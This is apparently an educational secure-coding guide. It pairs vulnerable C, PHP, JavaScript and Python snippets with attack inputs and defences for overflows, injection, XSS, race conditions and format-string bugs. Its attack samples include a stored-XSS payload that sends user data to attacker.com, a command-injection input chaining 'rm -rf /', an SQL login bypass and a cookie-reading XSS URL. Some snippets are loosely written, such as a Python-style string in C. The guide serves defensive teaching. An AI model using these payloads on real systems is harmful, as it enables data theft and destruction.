# Common Security Exploits: Analysis & Defense Guide

## Table of Contents
- [Buffer Overflow Exploits](#buffer-overflow-exploits)
- [Injection Attacks](#injection-attacks)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [Race Conditions](#race-conditions)
- [Memory Corruption](#memory-corruption)
- [Format String Attacks](#format-string-attacks)
- [Integer Overflow](#integer-overflow)
- [Defense Strategies](#defense-strategies)

## Buffer Overflow Exploits

### Stack Overflow
```c
// Vulnerable code
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
}

// Attack example
char exploit[128] = "A" * 64 + return_address + shellcode;
```

#### How It Works
1. Attacker sends input larger than buffer size
2. Extra data overwrites adjacent memory
3. Return address gets overwritten
4. Program flow redirected to malicious code

#### Defense Strategies
```c
// Safe version
void secure_function(char *input) {
    char buffer[64];
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';
}

// Compiler protections
gcc -fstack-protector-all -D_FORTIFY_SOURCE=2 -O2 program.c
```

### Heap Overflow
```c
// Vulnerable allocation
char* vulnerable_heap() {
    char* data = malloc(64);
    strcpy(data, very_long_input);  // Overflow
    return data;
}
```

#### How It Works
1. Overflow corrupts heap metadata
2. Manipulates memory allocator
3. Can lead to arbitrary write
4. Possible code execution

#### Defense
```c
// Safe allocation
char* secure_heap(size_t input_size) {
    if (input_size > MAX_SIZE) return NULL;
    char* data = malloc(input_size + 1);
    if (!data) return NULL;
    strncpy(data, input, input_size);
    data[input_size] = '\0';
    return data;
}
```

## Injection Attacks

### SQL Injection
```sql
-- Vulnerable query
"SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";

-- Attack input
username: admin' --
password: anything
```

#### How It Works
1. Unvalidated input modifies query structure
2. Comments out remaining query
3. Changes query logic
4. Bypasses authentication

#### Defense
```python
# Parameterized queries
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password)
)

# Input validation
def validate_input(user_input):
    return re.match("^[a-zA-Z0-9_-]+$", user_input)
```

### Command Injection
```php
// Vulnerable code
system("ping " . $_GET['host']);

// Attack input
host=8.8.8.8; rm -rf /
```

#### How It Works
1. Input contains command separators
2. Shell interprets as multiple commands
3. Executes unauthorized commands
4. Potential system compromise

#### Defense
```python
import shlex
import subprocess

def safe_command(command, args):
    # Whitelist allowed commands
    if command not in ['ping', 'nslookup']:
        raise ValueError('Command not allowed')
        
    # Use array form, never shell
    subprocess.run([command, args], shell=False)
```

## Cross-Site Scripting (XSS)

### Stored XSS
```javascript
// Vulnerable code
app.get('/comments', (req, res) => {
    db.query('SELECT * FROM comments', (err, results) => {
        res.send(results.map(r => r.comment).join('<br>'));
    });
});

// Attack payload
<script>
    fetch('/api/user-data')
        .then(r => r.json())
        .then(data => fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(data))));
</script>
```

#### How It Works
1. Malicious script stored in database
2. Served to other users
3. Executes in victim's browser
4. Steals sensitive data

#### Defense
```javascript
// Content Security Policy
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self'; object-src 'none';"
    );
    next();
});

// Output encoding
const encode = require('he');
app.get('/comments', (req, res) => {
    db.query('SELECT * FROM comments', (err, results) => {
        res.send(results.map(r => encode.encode(r.comment)).join('<br>'));
    });
});
```

### DOM-based XSS
```javascript
// Vulnerable code
document.getElementById('welcome').innerHTML = 
    'Welcome, ' + location.hash.slice(1);

// Attack URL
https://example.com#<img src=x onerror="alert(document.cookie)">
```

#### How It Works
1. Manipulates DOM directly
2. Bypasses server protections
3. Executes in page context
4. Access to same-origin data

#### Defense
```javascript
// Safe DOM manipulation
const text = document.createTextNode(location.hash.slice(1));
document.getElementById('welcome').appendChild(text);

// Input sanitization
function sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
}
```

## Race Conditions

### Time-of-check to Time-of-use (TOCTOU)
```python
# Vulnerable code
def process_file(filename):
    if os.access(filename, os.R_OK):  # Check
        with open(filename) as f:      # Use
            return f.read()

# Attack: File changes between check and use
```

#### How It Works
1. Check permissions at T1
2. File changes at T2
3. Operation occurs at T3
4. Security check bypassed

#### Defense
```python
# Atomic operations
import fcntl

def secure_process_file(filename):
    try:
        with open(filename) as f:
            fcntl.flock(f, fcntl.LOCK_EX)
            return f.read()
    finally:
        fcntl.flock(f, fcntl.LOCK_UN)
```

## Memory Corruption

### Use-After-Free
```cpp
// Vulnerable code
class Resource {
    // ... resource data
};

Resource* res = new Resource();
delete res;        // Free
res->someMethod(); // Use after free
```

#### How It Works
1. Memory is freed
2. Pointer still exists
3. Memory reused
4. Corrupted operations

#### Defense
```cpp
// Smart pointers
std::unique_ptr<Resource> res = std::make_unique<Resource>();
// Automatically freed when out of scope

// Null after free
Resource* res = new Resource();
delete res;
res = nullptr; // Prevent use after free
```

## Format String Attacks

### Printf Vulnerability
```c
// Vulnerable code
printf(user_input);  // Format string from user input

// Attack input
printf("%x %x %x");  // Reads stack values
```

#### How It Works
1. Format string controls printf
2. Reads arbitrary memory
3. Possible write to memory
4. Code execution risk

#### Defense
```c
// Safe printf
printf("%s", user_input);  // Format string is fixed

// Alternative
puts(user_input);  // No format string interpretation
```

## Integer Overflow

### Arithmetic Overflow
```c
// Vulnerable code
size_t size = n * sizeof(int);  // Can overflow
int* array = malloc(size);

// Attack
n = (SIZE_MAX / sizeof(int)) + 1;  // Causes wrap
```

#### How It Works
1. Calculation exceeds type limits
2. Wraps around to small value
3. Allocation too small
4. Buffer overflow occurs

#### Defense
```c
// Safe multiplication
size_t secure_multiply(size_t a, size_t b) {
    size_t result;
    if (b && a > SIZE_MAX / b) return 0;  // Overflow
    result = a * b;
    return result;
}

// Check before allocation
size_t size = secure_multiply(n, sizeof(int));
if (size == 0) return NULL;
int* array = malloc(size);
```

## Defense Strategies

### Compiler Protections
```bash
# GCC security flags
gcc -fstack-protector-all \    # Stack canaries
    -D_FORTIFY_SOURCE=2 \     # Buffer overflow checks
    -O2 \                     # Enable fortify
    -Wformat \               # Format string warnings
    -Wformat-security \      # More format warnings
    -fPIE \                  # Position Independent Executable
    -pie \                   # Enable PIE
    program.c
```

### Runtime Protections
1. Address Space Layout Randomization (ASLR)
```bash
# Enable ASLR
echo 2 > /proc/sys/kernel/randomize_va_space
```

2. Data Execution Prevention (DEP)
```bash
# Enable NX bit in Linux
execstack -c program
```

### Code Review Checklist
1. Input Validation
   - Size limits
   - Type checking
   - Format validation
   - Encoding verification

2. Memory Management
   - Bounds checking
   - Proper allocation/deallocation
   - Use of safe functions
   - Smart pointers

3. Error Handling
   - All paths handled
   - No information leakage
   - Proper logging
   - Secure defaults

## Additional Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [Microsoft Security Development Lifecycle](https://www.microsoft.com/en-us/securityengineering/sdl/)
- [CERT Secure Coding Standards](https://wiki.sei.cmu.edu/confluence/display/seccode)

## Contributing
Contributions welcome via:
1. Bug reports
2. New exploit examples
3. Defense strategies
4. Documentation improvements

## License
MIT License

## Disclaimer
This guide is for educational purposes only. Use this knowledge responsibly and only on systems you own or have explicit permission to test.
